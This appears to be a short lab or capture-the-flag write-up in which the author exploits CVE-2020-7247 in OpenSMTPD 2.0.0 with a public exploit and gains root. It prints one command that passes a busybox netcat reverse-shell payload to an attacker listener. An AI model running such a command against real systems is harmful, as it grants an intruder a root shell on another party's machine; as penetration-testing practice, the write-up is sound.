Proof#

On port 25 the service OpenSMTPD 2.0.0 is running. This version is vulnerable to CVE-2020-7247 for which we can find this public exploit. I executed it with a busybox reverse shell command after starting a netcat listener on port 80.

└─$ python3 poc.py 192.168.120.71 25 "busybox nc 192.168.45.198 80 -e /bin/bash"

I received a reverse shell as root and was able to read /root/proof.txt.
